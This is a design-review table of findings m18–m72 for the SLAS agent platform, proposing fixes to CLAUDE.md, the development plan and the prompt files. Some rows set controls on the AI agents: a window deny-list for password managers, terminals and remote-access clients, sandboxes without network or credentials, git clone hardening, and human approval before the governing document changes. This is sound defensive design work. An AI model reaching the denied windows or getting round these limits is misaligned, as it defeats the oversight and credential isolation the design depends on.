| m18 | `CLAUDE.md:166`, `CLAUDE.md:739`, `CLAUDE.md:786`, `docs/DEVELOPMENT_PLAN.md:89`, `docs/PROMPTS.md:117` | 'quota' is an API responsibility but no quota dimensions or defaults are defined | CLAUDE.md §13 add `config/quotas.yaml`; §5 add a short 'Quotas' list: per user `sandboxes_concurrent 2`, `sandbox_cpu 4`, `sandbox_mem_gb 8`, `sandbox_disk_gb 20`, `screen_sessions 1`, `tokens_per_day 2M`; per resource `runs_concurrent 1 per target or station`; enforced by the API before ticket creation with a sentence such as 'You already have 2 sandboxes running; stop one to start this task.' Roles in `rbac-roles.yaml` may override. DEVELOPMENT_PLAN P6 done-when: add 'a third concurrent sandbox is refused with that sentence'. |
| m19 | `CLAUDE.md:576`, `CLAUDE.md:244`, `CLAUDE.md:573-574`, `docs/DEVELOPMENT_PLAN.md:79` | Qdrant snapshot, Postgres FTS and the document corpus are backed up independently; no reindex operation is defined | CLAUDE.md §8.4 add: 'Qdrant and FTS are derived data; `Knowledge/ingest-manifest.yaml` (hash per document) is the source of truth. `slas knowledge reindex` rebuilds both from Knowledge/ and MinIO and runs automatically at the end of `slas backup restore`. Qdrant snapshots are an optimisation, not a required backup.' Add `knowledge reindex\|status` to the §3 CLI list and to P5 scope. |
| m20 | `CLAUDE.md:108`, `CLAUDE.md:430`, `docs/PROMPTS.md:142`, `docs/ui-demo/slas-ui-demo.html:636`, `CLAUDE.md:591`, `CLAUDE.md:424`, `docs/ui-demo/slas-ui-demo.html:670` | INV-14 allows the UI only a fingerprint, but §5.7's UI row shows 'PAT last-4' | CLAUDE.md §5.7 row 'UI' (line 430): change 'the SSH fingerprint or PAT last-4' to 'a fingerprint — the SSH key fingerprint, or for a PAT the first 8 hex characters of its SHA-256'. Leave INV-14 (line 108) as written. |
| m21 | `CLAUDE.md:446-447`, `CLAUDE.md:747`, `CLAUDE.md:238-242`, `CLAUDE.md:232-234` | 'Publish to repo' for Validation/Factory exports has no on-disk clone path, git-broker mounts only Coding/, and no phase implements it | CLAUDE.md §4.4 after line 242: add '├── Docs/<remote-name>/.git # broker-owned clone used by Publish to repo; never mounted into a sandbox'. CLAUDE.md §12 line 747: add "${SLAS_DATA_ROOT}/Docs:/data/Docs" and "${SLAS_DATA_ROOT}/SOP:/data/SOP:ro" and "${SLAS_DATA_ROOT}/Tickets:/data/Tickets:ro" to the broker volumes. docs/DEVELOPMENT_PLAN.md P7 scope (line 115-121): add 'Publish to repo for run exports through the broker' with a done-when line; mirror in docs/PROMPTS.md P7 (line 152-161). |
| m22 | `CLAUDE.md:237`, `CLAUDE.md:441` | §4.4 says no remotes are on disk under Coding/, but §5.7 says `git remote -v` shows a URL after a broker clone | In CLAUDE.md §4.4 line 237: '# Credentials are never on disk here; `.git/config` may hold a remote URL without a secret after a broker clone'. In §5.7 row 'Remotes' (line 441): state that the broker strips `remote.<n>.url`/`pushurl` after clone and never reads them (recommended, see #2), so `git push` in the sandbox fails with 'no such remote' and the UI message at line 441 still applies. |
| m23 | `CLAUDE.md:412`, `CLAUDE.md:451`, `CLAUDE.md:429` | Clone-side hardening is unspecified: size caps, fsck and worktree scanning; submodule `ext::`/`file://` risk is already blocked by git defaults | In CLAUDE.md §5.7 'Hostile-repo hardening' add for clone/fetch: `--no-recurse-submodules -c submodule.recurse=false -c transfer.fsckObjects=true -c core.symlinks=false`, a per-host `max_repo_mb` in git-hosts.yaml enforced by refusing oversize packs; and 'the broker never runs tools over a worktree (objects only)'. |
| m24 | `CLAUDE.md:442`, `CLAUDE.md:630`, `CLAUDE.md:429`, `CLAUDE.md:108`, `CLAUDE.md:148` | Bundle export bypasses the validation gate that governs every other way history leaves the perimeter | In CLAUDE.md §5.7 'Offline sync' and INV-14: 'bundle export runs the same validation gate as push over the exported range; the gate result and the bundle's content hash are recorded on the ticket'. Add the case to DEVELOPMENT_PLAN.md P6 done-when. |
| m25 | `CLAUDE.md:439`, `CLAUDE.md:346-347`, `docs/ui-demo/slas-ui-demo.html:584` | Terminal sessions are 'recorded to the ticket' but the ticket schema has no slot and the recorded content is undefined | §5.7 Terminal row: "Recording = PTY output only (asciicast v2), never keystrokes; passed through config/redaction.yaml before write; stored as `logs.terminal[]`, one file per session under Tickets/<id>/terminal/." Add `terminal` to the §5.4 `logs{}` schema. |
| m26 | `CLAUDE.md:308`, `CLAUDE.md:473`, `CLAUDE.md:344` | The hard stop on focus change has no defined outcome for step, on_failure, ticket or lease | Add to §5.2: 'A hard stop fails the current step with reason `focus_changed`, keeps both screenshots, ignores any `on_failure: retry`, and moves the ticket to Needs review; the lease is kept (Validation: target left as is; Factory: station held). MES is informed through the adapter's report call.' |
| m27 | `CLAUDE.md:276-277`, `CLAUDE.md:344`, `CLAUDE.md:666`, `docs/DEVELOPMENT_PLAN.md:50`, `docs/PROMPTS.md:69`, `CLAUDE.md:277` | P2's NullAgent cannot satisfy the Agent protocol's closed name Literal under mypy --strict without masquerading as a real agent | CLAUDE.md line 277 → 'name: Literal["coding", "validation", "factory", "null"] # "null" is the test-only NullAgent; never registered in a production build'. docs/DEVELOPMENT_PLAN.md P2 scope line 50: 'NullAgent tickets are T-null-<seq> and are filtered out of the Tickets page by default'. |
| m28 | `CLAUDE.md:278`, `CLAUDE.md:653`, `CLAUDE.md:601` | Agent.ingest() accepts only Upload \| MesTicket, but Factory also triggers from label scan and manual station pick | In CLAUDE.md §5.1 line 278: `def ingest(self, raw: Upload \| MesTicket \| LabelScan \| ManualTrigger) -> Job: ...` and add `LabelScan`, `ManualTrigger` to the `slas-schemas` list in DEVELOPMENT_PLAN P2 (line 48). |
| m29 | `CLAUDE.md:257`, `CLAUDE.md:278`, `CLAUDE.md:284-285` | §5.1 lifecycle says kernel.ingest() while the protocol makes ingest an agent method | In CLAUDE.md §5.1 line 257: replace 'kernel.ingest() → normalized Job' with 'kernel receives the raw input, calls agent.ingest(raw) → Job, and validates the Job schema'. Add to line 285: 'input parsing (suite .xlsx, MES adapter) is agent code behind `ingest()`'. |
| m30 | `CLAUDE.md:280`, `CLAUDE.md:315-316`, `CLAUDE.md:332`, `CLAUDE.md:325` | `Verdict` names both the per-step verify() result and the Consensus Router output / vote field | In CLAUDE.md §5.1 line 280: rename the return type to `StepResult` (pass \| fail \| retry). Keep `Verdict`/`ConsensusVerdict` for §5.3 (lines 316, 325, 332) and add to §5.3 after line 337: 'a ConsensusVerdict is never accepted where a StepResult or an Approval is required (INV-11)'. |
| m31 | `CLAUDE.md:294`, `CLAUDE.md:739`, `CLAUDE.md:440` | Coding's `inband` driver is described as SSH, but the sandbox has no network and the docs elsewhere use the sandbox-manager exec API | In CLAUDE.md §5.2 line 294, Reaches cell: 'commands, files, system config — over SSH on targets and stations; over the sandbox-manager exec API inside a sandbox (no network)'. |
| m32 | `CLAUDE.md:233`, `CLAUDE.md:439`, `CLAUDE.md:738-741`, `docs/DEVELOPMENT_PLAN.md:89`, `docs/PROMPTS.md:117` | Sandbox and terminal TTLs are referenced but have no value, semantics or owner | CLAUDE.md §12 sandbox-manager env add `SANDBOX_IDLE_TTL_MIN: "60"` and `SANDBOX_MAX_TTL_H: "12"`; §5.7 Terminal row add: 'idle TTL 60 min, extended while an agent step or terminal input is active; 5-minute warning in the UI; on expiry uncommitted changes are committed to a `slas/autosave-<ts>` branch with trailer `Slas-Agent: autosave`.' DEVELOPMENT_PLAN P6 done-when: 'an idle sandbox is reaped with the autosave branch present'. |
| m33 | `CLAUDE.md:345-347`, `CLAUDE.md:107`, `CLAUDE.md:332-333`, `docs/PROMPTS.md:72-73` | Ticket schema gives only `sop` a language dimension; which ticket fields a bilingual ticket export renders is unstated | §5.4: 'ticket export = ticket.json + ticket.en.md + ticket.zh-Hant.md; every model-authored prose field (rca.cause, rca.evidence[], finding text) passes through the §5.5 pipeline at export; vote sentences and state names are code-templated in both languages.' |
| m34 | `CLAUDE.md:476`, `CLAUDE.md:107` | Skill `sop_summary: {en, zh}` does not say both keys are required when present | CLAUDE.md §6.1 line 476: change the comment to '# optional; if present both en and zh are required (schema: required [en, zh]); kernel generates both if absent'. |
| m35 | `CLAUDE.md:268`, `CLAUDE.md:355-356`, `CLAUDE.md:643`, `docs/ui-demo/slas-ui-demo.html:797`, `docs/DEVELOPMENT_PLAN.md:120` | Owner routing table and severity scale do not exist anywhere | Copy the demo's scale into §5.4 (S1 blocks boot or loses a device · S2 degraded, still operable · S3 cosmetic or informational). Add `config/routing.yaml` to §13 with `owners: [...]` and `rules: [{match: {signal}, owner}]`, evaluated by code after the vote; disagreement between rule and vote marks the field 'your call'. |
| m36 | `CLAUDE.md:367-368`, `CLAUDE.md:775`, `CLAUDE.md:566`, `docs/DEVELOPMENT_PLAN.md:81-82` | docs/glossary.yaml is a hard dependency of §5.5 and the §8.1 terminology gate but has no defined schema or seeding rule (its absence today is planned for P5) | In CLAUDE.md §5.5 (367-368) add one line: 'docs/glossary.yaml schema: `terms: [{key, en, zh-Hant, do_not_translate: bool, note}]`; seeded before P5 with every §14 term, the product name, the three agent names, and the owner and severity codes; CI fails if a §14 term is missing.' |
| m37 | `CLAUDE.md:661`, `CLAUDE.md:809`, `docs/DEVELOPMENT_PLAN.md:141-143`, `docs/ui-demo/slas-ui-demo.html:1263` | The MES return path is unnamed and untested; P9 done-when stops at the hold | Add to §10.3: 'MES adapter interface: `receive() -> MesTicket` and `report(ticket, status in {in_test, pending_review, pass, fail, aborted}, payload)`; payload always carries mes_ref, ticket_id, sn, station, decided_by and the SOP paths; `report` is called on every ticket state change.' Extend P9 done-when: 'the fake MES receives pending_review on the hold and the final verdict with SN and station.' Transport and any richer status vocabulary stay under open decision (8). |
| m38 | `docs/ui-demo/slas-ui-demo.html:1268`, `CLAUDE.md:344`, `docs/ui-demo/slas-ui-demo.html:252`, `docs/ui-demo/slas-ui-demo.html:1244`, `CLAUDE.md:653`, `CLAUDE.md:345` | Demo uses the MES ticket number as the platform ticket id and hard-codes the SN for MES-triggered jobs | Add `mes_ref` to the §5.4 field list; keep the ticket id `T-factory-<seq>`; change the demo to show 'Ticket T-factory-2292 (production ticket F-2292)' and take the SN from the MES payload. |
| m39 | `CLAUDE.md:307-308`, `CLAUDE.md:98`, `CLAUDE.md:293`, `CLAUDE.md:299-300` | Window deny-list example names the platform host, which no driver reaches | Reword §5.2: 'Deny-list of windows, per driver instance: password managers and any terminal or remote-access client by default; on a station also the station configuration tool, MES client and the runner console, extended per station under Admin → Stations (`window_denylist`). A step that targets a denied window fails with a three-part error and a screenshot; it is never skipped silently.' Add P9 done-when: 'a step that focuses a denied window on the runner fake is refused and journalled'. |
| m40 | `docs/PROMPTS.md:177`, `docs/DEVELOPMENT_PLAN.md:141`, `CLAUDE.md:656-658`, `CLAUDE.md:46`, `CLAUDE.md:783` | The 'final-test-9-steps' factory template exists only in PROMPTS and plan P9; CLAUDE.md defines no such nine steps | docs/PROMPTS.md line 177 and docs/DEVELOPMENT_PLAN.md line 141 → 'the `final-test` template derived one-to-one from the §10.3 ACT stages (step count follows the template); the real station sequence replaces it in P10'. Or add a 'Default template `final-test` steps' list to CLAUDE.md §10.3 after line 658 once the owner supplies it. |
| m41 | `CLAUDE.md:95`, `CLAUDE.md:301-302`, `CLAUDE.md:639-640`, `CLAUDE.md:755` | No clock-synchronisation or clock-skew handling for journals, SEL correlation and station mTLS | CLAUDE.md §10.2 ACT: 'baseline records the BMC clock offset (`clock_offset_s`) in the journal header; VERIFY diffs SEL by record ID, never by timestamp'. §5.2 station runner bullet: 'the runner reports its clock offset on every heartbeat and tolerates ±24 h skew for certificate validation'. §3 `slas doctor`: 'checks that the host clock is synchronised to a site time source and names it'. §15 add open decision (12): is a site NTP source available in lab and factory, or must the platform be the stratum source? |
| m42 | `CLAUDE.md:662`, `CLAUDE.md:202`, `CLAUDE.md:668` | Station-originated files (logs, config dumps, backups) are written into the shared data root without a sanitisation, size or provenance rule | In CLAUDE.md §10.3 BACKUP: 'Station data is stored as opaque, size-capped blobs under fixed names from a manifest; the platform never extracts archives from a station; every returned artefact is signed by the runner and the signature recorded on the ticket. Screenshots and logs are untrusted input to the verdict and the human decision shows their provenance state.' |
| m43 | `CLAUDE.md:755`, `CLAUDE.md:654`, `CLAUDE.md:350`, `CLAUDE.md:809`, `docs/DEVELOPMENT_PLAN.md:135-136` | MES `file_drop` adapter creates tickets from unauthenticated files with no format, location, size, rate or template-lookup contract | In CLAUDE.md §10.3 TRIGGER add: 'file_drop reads from a directory outside the data root owned by a dedicated uid; each file is a Pydantic-validated record ≤ 64 KB, HMAC-signed with a key shared with MES; templates are selected by registered id from `templates/factory/index.yaml`, never by path; per-station rate cap; malformed files are quarantined and surface as a Needs-review ticket.' Record the choice as the ADR that closes open decision (8) and reconcile §12's default with it. |
| m44 | `CLAUDE.md:767-769`, `CLAUDE.md:743`, `CLAUDE.md:743-746` | git-broker is missing from the §12 start order | CLAUDE.md §12 line 769: change 'sandbox-manager → validation-executor' to 'sandbox-manager → git-broker → validation-executor'. |
| m45 | `CLAUDE.md:131-133`, `CLAUDE.md:405`, `docs/DEVELOPMENT_PLAN.md:92` | `slas git …` is referenced in §5.7 but absent from the §3 CLI list and from the P6 scope | CLAUDE.md §3 line 131-133: add '`git remote add\|test\|rotate\|rm`, `git push\|pull`, `git bundle export\|import`, admin `git hosts list\|add\|rm`'. docs/DEVELOPMENT_PLAN.md P6 scope line 98: after 'audit rows);' add '`slas git remote\|push\|pull\|bundle\|hosts`;'. |
| m46 | `CLAUDE.md:459`, `CLAUDE.md:782`, `docs/DEVELOPMENT_PLAN.md:67`, `docs/PROMPTS.md:91`, `docs/PROMPTS.md:237-238` | skill.schema.json is placed under packages/slas-schemas in §6.1 but under skills/schema in §13, plan P4 and PROMPTS | CLAUDE.md §6.1 line 459: change to '### 6.1 Schema (`skills/schema/skill.schema.json` is generated from this by `slas-schemas`)'. |
| m47 | `docs/DEVELOPMENT_PLAN.md:3`, `CLAUDE.md:7`, `CLAUDE.md:9`, `docs/DEVELOPMENT_PLAN.md:95-98`, `docs/PROMPTS.md:1-4` | DEVELOPMENT_PLAN.md says 'Companion to CLAUDE.md v3.0' while the SSOT is v3.1; PROMPTS.md has no version pointer | docs/DEVELOPMENT_PLAN.md line 3: 'Companion to `CLAUDE.md` v3.1.' docs/PROMPTS.md line 3: prepend 'Companion to `CLAUDE.md` v3.1.' Optionally add to the P6 done-when (after line 111): 'a remote on a host outside config/git-hosts.yaml is refused with the allowed-hosts sentence'. |
| m48 | `docs/PROMPTS.md:49-50`, `CLAUDE.md:800-801`, `docs/adr/0000-template.md:1-16`, `docs/PROMPTS.md:254` | PROMPTS P0 says 'using the template in §15', but §15 has only a field list; the real template docs/adr/0000-template.md is not referenced from CLAUDE.md | CLAUDE.md §15 line 800: change to 'ADRs in `docs/adr/NNNN-title.md`, copied from `docs/adr/0000-template.md` (Status, Date, Context, Decision, Consequences, Invariants touched).' docs/PROMPTS.md line 50: 'as accepted ADRs from docs/adr/0000-template.md.' docs/PROMPTS.md line 254: 'Read CLAUDE.md §15 and copy docs/adr/0000-template.md.' |
| m49 | `README.md:23-25`, `CLAUDE.md:118`, `README.md:20-25`, `CLAUDE.md:127-128`, `README.md:23-24` | README and CLAUDE.md disagree on the bundle file name and extraction layout | Adopt `slas-bundle-<version>.tar[.zst]` with top-level directory `slas-bundle-<version>/` as in README; update CLAUDE.md §3 line 118 to match and name the compression chosen in #4's LAYOUT.md. |
| m50 | `docs/PROMPTS.md:113`, `docs/PROMPTS.md:130`, `docs/DEVELOPMENT_PLAN.md:88`, `docs/DEVELOPMENT_PLAN.md:102-112`, `docs/PROMPTS.md:220-221` | PROMPTS splits P6 into P6a/P6b; the plan's phase, done-when, map, milestone and audit prompt know only P6 | docs/DEVELOPMENT_PLAN.md line 88-112: split into 'P6a — Coding Agent' (done-when up to 'ZIP downloads' plus the 3-iteration stall message) and 'P6b — Hybrid Git Control Engine' (push, terminal, PAT sink grep, hook, bundle criteria); add P6a → P6b to the map at line 20 and 'M4a first agent (local commits)' / 'M4b push through the broker' at line 171. |
| m51 | `docs/DEVELOPMENT_PLAN.md:34`, `CLAUDE.md:786`, `.gitignore:3-4`, `docs/PROMPTS.md:45-48` | Plan P0 scopes an unqualified `.env.example`; CLAUDE.md §13 and .gitignore both expect config/.env.example, and a root .env.example is gitignored | docs/DEVELOPMENT_PLAN.md line 34: change '`.env.example`' to '`config/.env.example`'. Optionally docs/PROMPTS.md P0 (line 48): add 'config/.env.example with every variable §12 references, commented'. Do not add the reviewer's '!config/.env.*.example' rule — no document defines such a file. |
| m52 | `docs/PROMPTS.md:56-57`, `docs/DEVELOPMENT_PLAN.md:40-41`, `CLAUDE.md:213-220`, `CLAUDE.md:800-801`, `docs/DEVELOPMENT_PLAN.md:40`, `CLAUDE.md:713` | P1 prompt and plan decide the edge server (Caddy) and password hash (argon2) that CLAUDE.md §4.3's runtime stack never records | CLAUDE.md §4.3 line 218 (after 'Git: ...'): add 'Edge: Caddy with a self-signed / internal-CA certificate generated by install.sh, auto-HTTPS/ACME and OCSP off. Auth: argon2id (`argon2-cffi`) for built-in passwords.' Record both in an ADR written at the start of P1 (or in a P0 dependency ADR) and reference it from §4.3. |
| m53 | `docs/PROMPTS.md:201`, `docs/DEVELOPMENT_PLAN.md:153`, `docs/DEVELOPMENT_PLAN.md:155-156`, `CLAUDE.md:124`, `CLAUDE.md:329-330`, `docs/DEVELOPMENT_PLAN.md:152-153` | P11 builds alerting in quickstart although §3 lists alerting as prod-only; 'a local channel' names no receiver | CLAUDE.md line 124 quickstart cell: 'Prometheus + Grafana with in-app alerts'; prod cell: '+ Loki, Tempo, Alertmanager/paging'. docs/PROMPTS.md line 201 and docs/DEVELOPMENT_PLAN.md line 153: 'alerts via Grafana unified alerting to a webhook on api, shown on Home and in `slas status` (no Alertmanager in quickstart)'. |
| m54 | `docs/PROMPTS.md:237-241`, `CLAUDE.md:800-803`, `docs/PROMPTS.md:261-263`, `CLAUDE.md:26-27` | 'Add a skill primitive' edits the INV-12 whitelist in CLAUDE.md §6.2 directly, skipping the ADR, version bump and diff-first that §15 and the 'Update CLAUDE.md' prompt require | docs/PROMPTS.md line 237-241: 'First write docs/adr/NNNN-skill-primitive-<name>.md (proposed) stating args, capability, risk class and why existing primitives cannot express it. Implement in slas_skills, the driver and fakes with tests; bump the skill schema version; update the Skills page help. Then propose the §6.2 row and the CLAUDE.md version bump as a diff and stop — do not apply until I approve. If the risk class is destructive, it must appear in the import-time and run-time approval messages.' |
| m55 | `CLAUDE.md:672`, `CLAUDE.md:777`, `CLAUDE.md:717-718`, `docs/PROMPTS.md:202-203`, `CLAUDE.md:768` | Orchestrator directory is services/orchestrator in §11 but services/agent-core-orchestrator in §12/§13, with image slas/orchestrator | In CLAUDE.md §11 line 672: replace `services/orchestrator` with `services/agent-core-orchestrator`; in §12 line 718 use image `registry.internal/slas/agent-core-orchestrator@sha256:…`; add a row to §0.1: 'Orchestrator service / container / image: `agent-core-orchestrator`'. |
| m56 | `docs/DEVELOPMENT_PLAN.md:62`, `docs/PROMPTS.md:84-85`, `docs/DEVELOPMENT_PLAN.md:5-6`, `CLAUDE.md:555-557` | P3 done-when 'swap coder from the UI and roll back' must be CI-green, but the prompt's fake vLLM is an HTTP fake and nothing says the reconciler is exercised against a fake container runtime or a fake image | docs/DEVELOPMENT_PLAN.md P3 done-when line 62 → 'in CI, with a fake vLLM shipped as a small container image (/health, /metrics, /v1/chat/completions, /v1/embeddings) started by the real reconciler under rootless Podman: swap `coder` with progress and roll back (e2e); ...'. docs/PROMPTS.md P3 line 84-85: 'Tests use a fake vLLM container image that returns scripted completions and can be told to violate the schema'. Keep the real-GPU swap as the M2 demo checklist. |
| m57 | `docs/DEVELOPMENT_PLAN.md:63-64`, `docs/DEVELOPMENT_PLAN.md:57-61`, `docs/PROMPTS.md:79-85`, `CLAUDE.md:563-567`, `docs/DEVELOPMENT_PLAN.md:82-83`, `docs/DEVELOPMENT_PLAN.md:64`, `CLAUDE.md:563-564`, `docs/PROMPTS.md:109-110`, `CLAUDE.md:775`, `CLAUDE.md:566-567`, `docs/DEVELOPMENT_PLAN.md:31-37`, `docs/DEVELOPMENT_PLAN.md:160` | P3 done-when asserts an eval harness that neither P3's scope nor its prompt builds; packages/slas-eval, judges.py and docs/golden-set have no owning phase | docs/DEVELOPMENT_PLAN.md P3 scope line 57-61: add '`packages/slas-eval` skeleton: `judges.py` bound to the gateway, `tests/eval` job wiring, CI static check that no eval module references api.openai.com, `docs/golden-set/README.md` with the label schema; ADR for Ragas/TruLens'. docs/PROMPTS.md P3 line 79-85: mirror. Then apply plan-sequencing-and-coverage#1's split of the done-when. |
| m58 | `docs/DEVELOPMENT_PLAN.md:75`, `docs/DEVELOPMENT_PLAN.md:191`, `CLAUDE.md:687-691` | P4 'runs on a real Xvfb display in CI' clashes in wording with §11's fake-only screen tests and the plan's own 'real displays only in P8 and P10', and names no CI runner requirement | docs/DEVELOPMENT_PLAN.md line 75 → 'the screen-worker container runs under CI on its own Xvfb (virtual, not a host display) as a tests/integration job and produces before/after screenshots; tests/screen stays fake-only'. CLAUDE.md line 688: after 'recorded fakes' add '(plus one integration job driving the screen-worker image on Xvfb)'. |
| m59 | `CLAUDE.md:380-381`, `docs/DEVELOPMENT_PLAN.md:71-72`, `docs/PROMPTS.md:97` | §5.6 says users write skills in the WebUI; P4 builds no editor | Either docs/DEVELOPMENT_PLAN.md P4 scope line 71-72: add 'skill editor (YAML with live schema validation and primitive help text)', or CLAUDE.md line 380 → 'Users write them by hand (an in-app editor is a later phase) and import them'. |
| m60 | `docs/DEVELOPMENT_PLAN.md:84-86`, `docs/PROMPTS.md:105-110`, `docs/PROMPTS.md:84-85`, `CLAUDE.md:367` | P5 done-when depends on model calls (embed, rerank, RCA draft, zh-Hant translation) and the P5 prompt names no fake for them | docs/DEVELOPMENT_PLAN.md P5 done-when line 84-86 → 'in CI against the fake gateway (scripted embeddings and rerank scores, canned RCA draft and votes, canned zh-Hant prose): a datasheet query returns a cited passage; a recorded log yields an RCA with 3 votes and an owner; the renderer emits EN and zh-Hant files whose extracted identifiers, commands and numbers are byte-identical (unit test)'. docs/PROMPTS.md P5 line 105-110: add 'extend the P3 fake vLLM with /v1/embeddings, a rerank endpoint and canned planner output'. |
| m61 | `CLAUDE.md:131-133`, `CLAUDE.md:780`, `docs/DEVELOPMENT_PLAN.md:92`, `docs/PROMPTS.md:116-122`, `docs/DEVELOPMENT_PLAN.md:71-72`, `docs/PROMPTS.md:91-99`, `docs/DEVELOPMENT_PLAN.md:170` | `slas logs`, `slas skill import\|export\|validate`, `slas upgrade` and packages/slas-cli are in no phase; the P6a prompt drops the `slas toolchain` verbs the plan's P6 includes | docs/DEVELOPMENT_PLAN.md: P0 scope line 32-35 add 'packages/slas-cli skeleton with `doctor`'; P4 scope line 67-72 add '`slas skill import\|export\|validate`'; P11 scope line 152-154 add '`slas logs`'; P12 scope line 159-160 add '`slas upgrade`'. docs/PROMPTS.md line 118: add 'and `slas toolchain list\|add`'. |
| m62 | `CLAUDE.md:122-124`, `CLAUDE.md:764`, `docs/DEVELOPMENT_PLAN.md:159-160`, `docs/PROMPTS.md:209-213`, `CLAUDE.md:124` | P12 omits Loki/Tempo, the prod backup-runner and Kata screen-worker isolation that §3 and §12 assign to prod | docs/DEVELOPMENT_PLAN.md P12 scope line 159-160: add 'Loki + Tempo with Grafana datasources and the trace_id link; backup-runner container (pgBackRest, Qdrant snapshots, station backups); screen-worker per-session isolation on Kata'. docs/PROMPTS.md line 209-213: mirror. |
| m63 | `docs/DEVELOPMENT_PLAN.md:13-20`, `docs/DEVELOPMENT_PLAN.md:5-6` | Dependency map draws P5 → P4 against the phase numbering and the sequential 'previous phase' rule | docs/DEVELOPMENT_PLAN.md line 13-20: redraw as 'P0 → P1 → P2 → P3 → {P4, P5} → {P6a → P6b, P7 → P8, P9 → P10} → P11 → P12', removing the P5 → P4 arrow; and change line 5-6 to 'until every phase it depends on in the map is green'. |
| m64 | `docs/DEVELOPMENT_PLAN.md:5-6`, `docs/DEVELOPMENT_PLAN.md:127-132`, `docs/DEVELOPMENT_PLAN.md:145-149`, `docs/DEVELOPMENT_PLAN.md:20-23`, `docs/DEVELOPMENT_PLAN.md:155-156`, `CLAUDE.md:690-691` | 'Previous phase green in CI' is incompatible with the hardware phases P8/P10 and with the map's parallel branches | docs/DEVELOPMENT_PLAN.md line 5-6 → 'Do not start a phase until the phases it depends on in the map are green: CI for P0-P7, P9 and P11; for P8 and P10 a recorded run (journal plus redacted logs) checked into tests/hal/recordings and reviewed.' |
| m65 | `CLAUDE.md:693-694`, `CLAUDE.md:759-763`, `docs/DEVELOPMENT_PLAN.md:40`, `docs/DEVELOPMENT_PLAN.md:151-154`, `docs/PROMPTS.md:199-202`, `CLAUDE.md:568-571`, `docs/DEVELOPMENT_PLAN.md:152-154` | Definition of done demands trace_id + metrics from every phase, but the prometheus/grafana/exporter containers are added to compose in no phase (P11 presumes them) | docs/DEVELOPMENT_PLAN.md P1 scope line 40: add 'prometheus, grafana, node-exporter (dcgm-exporter when a GPU is present) with scrape config and no dashboards; /metrics on api; a CI test asserts every service exposes /metrics and logs carry trace_id'. P11 keeps rules, dashboards and alerts. |
| m66 | `CLAUDE.md:587-588`, `CLAUDE.md:160-162`, `docs/DEVELOPMENT_PLAN.md:40`, `docs/DEVELOPMENT_PLAN.md:121`, `CLAUDE.md:587`, `CLAUDE.md:341`, `CLAUDE.md:238`, `docs/DEVELOPMENT_PLAN.md:50-51`, `docs/DEVELOPMENT_PLAN.md:120-121`, `CLAUDE.md:160`, `docs/DEVELOPMENT_PLAN.md:40-44` | Home and Runs pages (§9) are built by no phase | docs/DEVELOPMENT_PLAN.md P1 scope (line 40-42) and docs/PROMPTS.md P1 (line 56-61): add 'Home as the landing page (what is running, what needs me, one primary action per agent)'. docs/DEVELOPMENT_PLAN.md P7 scope (line 115-121) and docs/PROMPTS.md P7: add 'Runs page (all agents, filters, live status, link to ticket)'. plan-sequencing-and-coverage#5's 'Needs you' list belongs on this Home page. |
| m67 | `docs/DEVELOPMENT_PLAN.md:128-129`, `docs/DEVELOPMENT_PLAN.md:160`, `docs/PROMPTS.md:211`, `CLAUDE.md:709`, `CLAUDE.md:785`, `docs/DEVELOPMENT_PLAN.md:159-160` | macvlan overlay is scoped in both plan P8 and plan P12, §12 says it is prod-only, and only the P12 prompt builds it | Pick one: either docs/DEVELOPMENT_PLAN.md line 129 drop 'macvlan overlay' (P8 uses the host-routed slas-lab bridge; macvlan stays prod-only as §12 says), or — recommended — docs/DEVELOPMENT_PLAN.md line 129 and docs/PROMPTS.md P8 (line 167-171): 'compose/macvlan.override.yml for slas-lab (validation-executor only)', and line 160 / PROMPTS line 211: 'extend macvlan.override.yml to slas-factory'; then CLAUDE.md line 709 comment 'macvlan via compose/macvlan.override.yml (optional in quickstart, required in prod)'. |
| m68 | `CLAUDE.md:7-9`, `CLAUDE.md:800-803`, `docs/DEVELOPMENT_PLAN.md:3`, `docs/DEVELOPMENT_PLAN.md:34-37`, `docs/PROMPTS.md:49-50`, `docs/adr/0000-template.md:1-3` | git-broker (new container, network, data model, INV-14) is not covered by any scheduled ADR; P0 schedules only ADR-0001 and ADR-0002, and the plan still cites CLAUDE.md v3.0 | DEVELOPMENT_PLAN.md P0 scope: add 'ADR-0003 "Git broker: credentials only in git-broker (INV-14)"' and change done-when to 'three accepted ADRs'; line 3: 'v3.0' → 'v3.1'. PROMPTS.md P0: add docs/adr/0003-git-broker.md. CLAUDE.md: append '(ADR-0003)' to the §5.7 heading and to the INV-14 row, and to line 9. |
| m69 | `docs/PROMPTS.md:116-118`, `CLAUDE.md:738-742`, `CLAUDE.md:233-234` | 'read-only rootfs' for sandboxes exists only in PROMPTS P6a; the SSOT states no hardening or writable set for the sandbox itself | CLAUDE.md §12 line 742 comment → '# sandboxes: read-only rootfs, no network, cap_drop ALL, no-new-privileges, PIDS limit; writable: Projects/<slug> (rw bind), Container/<session> overlay mounted as $HOME and tool caches, /tmp tmpfs; git ships for local commits; NO remote route and NO credentials (INV-14)'. docs/DEVELOPMENT_PLAN.md P6 scope line 89-90: add 'read-only rootfs with the writable set from §12'. |
| m70 | `CLAUDE.md:98`, `CLAUDE.md:731`, `CLAUDE.md:740`, `CLAUDE.md:222`, `CLAUDE.md:440`, `docs/PROMPTS.md:270-271` | INV-4's 'runtime socket' clause and §4.3's DinD rejection do not name the podman.sock carve-out that §12 relies on twice | CLAUDE.md §2 INV-4 line 98: append 'Exception: model-manager and sandbox-manager hold the rootless Podman socket; they accept only schema-validated requests (container id, argv list, cwd, timeout) from the orchestrator or api and never evaluate content or paths from model output.' §4.3 line 222: reword to 'Docker-in-Docker inside any agent-facing container (needs privileged or a socket)'. §11 tests: add the compose lint that PROMPTS.md line 270-271 already describes. |
| m71 | `CLAUDE.md:736-737`, `CLAUDE.md:672-673`, `CLAUDE.md:727`, `docs/PROMPTS.md:105-106` | local-search-api on slas-inference weakens 'llm-gateway is the only component talking to vLLM' | In §12 local-search-api: networks [slas-knowledge, slas-backend, slas-observability] (drop slas-inference) and add the comment 'embed/rerank via llm-gateway roles `embed`, `rerank`'. Keep prometheus as the only non-gateway member of slas-inference besides model-manager. |
| m72 | `CLAUDE.md:214-220`, `CLAUDE.md:295`, `CLAUDE.md:429`, `CLAUDE.md:39`, `CLAUDE.md:668-669` | §4.3 omits the libraries the HAL, skills, xlsx parsing and gate obviously need | In §4.3 add a 'Pre-approved libraries (pinned in uv.lock)' line: asyncssh, httpx, pyghmi (or ipmitool binary), openpyxl, jsonschema, structlog, gitleaks binary, PyAutoGUI + python3-xlib + Pillow; state 'anything not on this list still needs a question first'. |
